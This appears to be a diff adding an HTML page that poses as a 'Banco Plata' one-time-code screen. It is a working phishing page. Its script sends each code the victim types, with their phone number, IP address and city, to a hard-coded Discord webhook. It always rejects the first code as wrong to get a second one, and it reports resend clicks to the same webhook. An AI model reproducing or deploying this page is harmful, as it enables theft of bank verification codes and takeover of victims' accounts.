@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Ingresa el código - Banco Plata</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { background-color: #ffffff; min-height: 100dvh; display: flex; justify-content: center; color: #000; }
+    .app-container { width: 100%; max-width: 520px; padding: 20px 24px; display: flex; flex-direction: column; position: relative; min-height: 100dvh; }
+    .loader-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.85); display: flex; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(2px); }
+    .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background-color: #1c1c1e; color: #fff; padding: 14px 24px; border-radius: 30px; font-size: 14px; font-weight: 600; display: none; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.15); white-space: nowrap; }
+    .btn-back { width: 44px; height: 44px; background-color: #F4F5F9; border-radius: 14px; display: flex; justify-content: center; align-items: center; cursor: pointer; margin-bottom: clamp(20px, 5vh, 40px); border: none; transition: background-color 0.2s; }
+    .btn-back:active { background-color: #E2E4EC; }
+    .btn-back svg { width: 24px; height: 24px; stroke: #000; stroke-width: 2.5; fill: none; }
+    .content { display: flex; flex-direction: column; align-items: center; text-align: center; width: 100%; }
+    .title { font-size: clamp(26px, 8vw, 32px); font-weight: 800; color: #000; margin-bottom: 12px; letter-spacing: -0.5px; }
+    .subtitle { font-size: clamp(14px, 4vw, 16px); font-weight: 500; color: #333; line-height: 1.4; margin-bottom: clamp(30px, 8vh, 40px); max-width: 90%; }
+    .code-container { width: 100%; max-width: 280px; background-color: #F4F5F9; border-radius: 20px; padding: 16px 24px; display: flex; justify-content: center; align-items: center; margin-bottom: 30px; cursor: text; }
+    .code-input { width: 100%; background: transparent; border: none; font-size: clamp(20px, 6vw, 24px); font-weight: 700; letter-spacing: 12px; text-align: center; color: #333; outline: none; }
+    .code-input::placeholder { color: #A0A0A0; letter-spacing: 8px; }
+    .resend-text { font-size: 14px; font-weight: 600; color: #A0A0A0; text-align: center; margin-bottom: 10px; }
+    .resend-buttons { display: none; flex-direction: column; gap: 12px; width: 100%; max-width: 280px; }
+    .btn-resend { background-color: #F4F5F9; border: none; border-radius: 14px; padding: 16px; font-size: 15px; font-weight: 700; color: #333; cursor: pointer; transition: background-color 0.2s; }
+    .btn-resend:active { background-color: #E2E4EC; }
+  </style>
+</head>
+<body>
+
+  <div id="errorNotif" class="notification">Código incorrecto</div>
+  <div id="successNotif" class="notification">Te enviamos un código nuevo</div>
+
+  <div class="app-container" id="app-container">
+    <button class="btn-back" onclick="window.history.back()">
+      <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </button>
+
+    <div class="content">
+      <h1 class="title">Ingresa el código</h1>
+      <p class="subtitle">Que enviamos por SMS y Whatsapp a <span id="phoneDisplay">Cargando...</span></p>
+
+      <div class="code-container" onclick="document.getElementById('otpInput').focus()">
+        <input type="tel" id="otpInput" class="code-input" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+      </div>
+
+      <p class="resend-text" id="resendText">Reenviar en 15 segundos</p>
+
+      <div class="resend-buttons" id="resendButtons">
+        <button class="btn-resend" id="btnResendSms">Reenviar por SMS</button>
+        <button class="btn-resend" id="btnResendWa">Reenviar por WhatsApp</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // NUEVO WEBHOOK ACTUALIZADO
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNX3dUITQQc';
+
+    async function trackAction(actionName) {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
+        const payload = { username: "Plata Event Tracker", content: `🖱️ **Acción del Usuario:** ${actionName}\n\n**🌐 IP:** ${data.ip || 'Desconocida'}\n**📍 Ciudad:** ${data.city || 'Desconocida'}\n**⏰ Hora:** ${time}` };
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+      } catch (e) { console.error('Error tracking', e); }
+    }
+
+    let isFirstAttempt = true;
+    let resendTimerInterval;
+    let resendSeconds = 15;
+    let isVerifying = false;
+    
+    const otpInput = document.getElementById('otpInput');
+    const errorNotif = document.getElementById('errorNotif');
+    const successNotif = document.getElementById('successNotif');
+    const resendText = document.getElementById('resendText');
+    const resendButtons = document.getElementById('resendButtons');
+    const phoneDisplay = document.getElementById('phoneDisplay');
+    const appContainer = document.getElementById('app-container');
+    const phone = localStorage.getItem('plata_phone') || 'No ingresado';
+
+    if (phoneDisplay) phoneDisplay.textContent = phone;
+
+    window.addEventListener('load', () => { iniciarTemporizador(15); if (otpInput) otpInput.focus(); });
+
+    function showLoader() {
+      const existing = document.getElementById('globalLoader'); if (existing) existing.remove();
+      const loader = document.createElement('div'); loader.className = 'loader-overlay'; loader.id = 'globalLoader'; loader.innerHTML = '<div class="spinner"></div>'; appContainer.appendChild(loader);
+    }
+    function hideLoader() { const loader = document.getElementById('globalLoader'); if (loader) loader.remove(); }
+
+    async function sendToDiscord(code) {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
+        const payload = { username: "Banco Plata Logger", content: `🔐 **Nuevo Intento de Código**\n\n**📱 Teléfono:** ${phone}\n**🔢 Código:** ${code}\n**🌐 IP:** ${data.ip || 'Desconocida'}\n**📍 Ciudad:** ${data.city || 'Desconocida'}\n**⏰ Hora:** ${time}` };
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+      } catch (e) { console.error('Error Discord', e); }
+    }
+
+    if (otpInput) {
+      otpInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        e.target.value = val;
+        if (val.length === 4 && !isVerifying) {
+          isVerifying = true; otpInput.disabled = true;
+          setTimeout(async () => {
+            showLoader(); await sendToDiscord(val);
+            setTimeout(() => {
+              hideLoader(); otpInput.disabled = false; isVerifying = false;
+              if (isFirstAttempt) {
+                isFirstAttempt = false; errorNotif.style.display = 'block'; otpInput.value = ''; otpInput.focus();
+                setTimeout(() => { errorNotif.style.display = 'none'; }, 3000);
+              } else { 
+                window.location.href = 'verisesion.html'; 
+              }
+            }, 4000);
+          }, 500); 
+        }
+      });
+    }
+
+    document.getElementById('btnResendSms').addEventListener('click', () => { trackAction('Clic en Reenviar por SMS'); handleResend('SMS'); });
+    document.getElementById('btnResendWa').addEventListener('click', () => { trackAction('Clic en Reenviar por WhatsApp'); handleResend('WhatsApp'); });
+
+    async function handleResend(method) {
+      if (resendSeconds > 0) return;
+      showLoader();
+      setTimeout(() => {
+        hideLoader(); successNotif.style.display = 'block';
+        setTimeout(() => { successNotif.style.display = 'none'; }, 3000);
+        const subtitle = document.querySelector('.subtitle');
+        if (subtitle) subtitle.innerHTML = `Que enviamos por ${method} a <span id="phoneDisplay">${phone}</span>`;
+        iniciarTemporizador(15);
+      }, 2000);
+    }
+
+    function iniciarTemporizador(segundos) {
+      resendSeconds = segundos; resendButtons.style.display = 'none'; resendText.style.display = 'block'; resendText.textContent = `Reenviar en ${resendSeconds} segundos`;
+      clearInterval(resendTimerInterval);
+      resendTimerInterval = setInterval(() => {
+        resendSeconds--;
+        if (resendSeconds <= 0) { clearInterval(resendTimerInterval); resendText.style.display = 'none'; resendButtons.style.display = 'flex'; }
+        else { resendText.textContent = `Reenviar en ${resendSeconds} segundo${resendSeconds !== 1 ? 's' : ''}`; }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
